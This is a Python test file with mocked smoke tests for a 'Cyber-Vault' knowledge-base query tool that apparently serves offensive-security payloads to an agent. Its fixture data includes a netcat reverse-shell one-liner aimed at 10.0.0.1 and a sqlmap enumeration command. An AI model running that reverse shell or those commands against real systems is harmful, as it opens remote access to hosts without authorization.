"""Smoke tests for the Cyber-Vault knowledge tool (query_knowledge_base).

All ChromaDB / SentenceTransformer calls are mocked so the tests run without
the heavy ML dependencies being installed and without a real database on disk.

``asyncio_mode = "auto"`` in pyproject.toml means every ``async def`` test is
awaited automatically by pytest-asyncio — no extra mark needed.
"""
from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_chroma_collection(docs, metas, distances):
    """Return a fake ChromaDB collection whose .query() returns fixed data."""
    col = MagicMock()
    col.query.return_value = {
        "documents": [docs],
        "metadatas": [metas],
        "distances": [distances],
    }
    return col


def _make_chroma_client(collection):
    """Return a fake PersistentClient that hands back *collection*."""
    client = MagicMock()
    client.get_collection.return_value = collection
    return client


def _patch_chroma(collection):
    """Context-manager that patches chromadb.PersistentClient."""
    import unittest.mock as mock

    chromadb_mod = MagicMock()
    chromadb_mod.PersistentClient.return_value = _make_chroma_client(collection)
    return mock.patch.dict("sys.modules", {"chromadb": chromadb_mod})


def _patch_st():
    """Context-manager that patches sentence_transformers.SentenceTransformer."""
    import unittest.mock as mock

    model = MagicMock()
    # encode returns a list-of-lists compatible with .tolist()
    model.encode.return_value = MagicMock(tolist=lambda: [[0.1, 0.2, 0.3]])

    st_mod = MagicMock()
    st_mod.SentenceTransformer.return_value = model
    return mock.patch.dict("sys.modules", {"sentence_transformers": st_mod})


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

class TestQueryKnowledgeBase:

    def _reset_singletons(self):
        """Force vault module to re-initialise singletons between tests."""
        import cai.tools.knowledge.vault as vault_mod
        vault_mod._client = None
        vault_mod._collection = None
        vault_mod._embed_fn = None

    async def test_empty_query_returns_error(self):
        from cai.tools.knowledge.vault import query_knowledge_base
        result = await query_knowledge_base("")
        assert "[CYBER-VAULT]" in result

    async def test_missing_database_returns_helpful_message(self):
        """If the ChromaDB directory does not exist, return actionable guidance."""
        self._reset_singletons()
        with patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/nonexistent/path/chroma_db")):
            from cai.tools.knowledge.vault import query_knowledge_base
            result = await query_knowledge_base("SQL injection")
        assert "ingest_vault.py" in result or "not found" in result.lower()

    async def test_returns_offline_vault_header(self):
        """Successful queries are prefixed with [LOCAL KNOWLEDGE - OFFLINE VAULT]."""
        self._reset_singletons()
        docs = ["Use `sqlmap -u URL --dbs` for database enumeration."]
        metas = [{"source": "PayloadsAllTheThings/SQLi.md", "chunk_index": 0}]
        distances = [0.12]
        col = _make_chroma_collection(docs, metas, distances)

        with _patch_chroma(col), _patch_st(), \
                patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/fake/chroma_db")), \
                patch("pathlib.Path.exists", return_value=True):
            from cai.tools.knowledge.vault import query_knowledge_base
            result = await query_knowledge_base("SQL injection attacks")

        assert "[LOCAL KNOWLEDGE - OFFLINE VAULT]" in result

    async def test_source_path_appears_in_output(self):
        """Source file path from metadata is included in the formatted result."""
        self._reset_singletons()
        docs = ["nc -e /bin/bash 10.0.0.1 4444"]
        metas = [{"source": "PayloadsAllTheThings/Reverse_Shell.md", "chunk_index": 3}]
        distances = [0.08]
        col = _make_chroma_collection(docs, metas, distances)

        with _patch_chroma(col), _patch_st(), \
                patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/fake/chroma_db")), \
                patch("pathlib.Path.exists", return_value=True):
            from cai.tools.knowledge.vault import query_knowledge_base
            result = await query_knowledge_base("reverse shell one-liner")

        assert "PayloadsAllTheThings/Reverse_Shell.md" in result

    async def test_no_results_message(self):
        """Empty document list from ChromaDB produces a friendly message."""
        self._reset_singletons()
        col = _make_chroma_collection([], [], [])

        with _patch_chroma(col), _patch_st(), \
                patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/fake/chroma_db")), \
                patch("pathlib.Path.exists", return_value=True):
            from cai.tools.knowledge.vault import query_knowledge_base
            result = await query_knowledge_base("obscure protocol exploit")

        assert "No results" in result

    async def test_top_k_clamped_to_safe_range(self):
        """top_k values outside [1,10] are clamped without raising exceptions."""
        self._reset_singletons()
        docs = ["payload A", "payload B"]
        metas = [{"source": "a.md", "chunk_index": 0}, {"source": "b.md", "chunk_index": 0}]
        distances = [0.1, 0.2]
        col = _make_chroma_collection(docs, metas, distances)

        with _patch_chroma(col), _patch_st(), \
                patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/fake/chroma_db")), \
                patch("pathlib.Path.exists", return_value=True):
            from cai.tools.knowledge.vault import query_knowledge_base
            # Extremely large value should not raise
            await query_knowledge_base("SUID escalation", top_k=999)
            # n_results should have been clamped to 10
            col.query.assert_called_once()
            _, call_kwargs = col.query.call_args
            assert call_kwargs.get("n_results", 10) <= 10

    async def test_chromadb_not_installed_returns_error(self):
        """Missing chromadb package returns an install message, not a traceback."""
        self._reset_singletons()
        import builtins
        real_import = builtins.__import__

        def mock_import(name, *args, **kwargs):
            if name == "chromadb":
                raise ModuleNotFoundError("No module named 'chromadb'")
            return real_import(name, *args, **kwargs)

        with patch("builtins.__import__", side_effect=mock_import), \
                patch("cai.tools.knowledge.vault._CHROMA_DIR", Path("/fake/chroma_db")), \
                patch("pathlib.Path.exists", return_value=True):
            from cai.tools.knowledge.vault import query_knowledge_base
            result = await query_knowledge_base("SSRF exploit")

        assert (
            "chromadb" in result.lower()
            or "not installed" in result.lower()
            or "not found" in result.lower()
        )
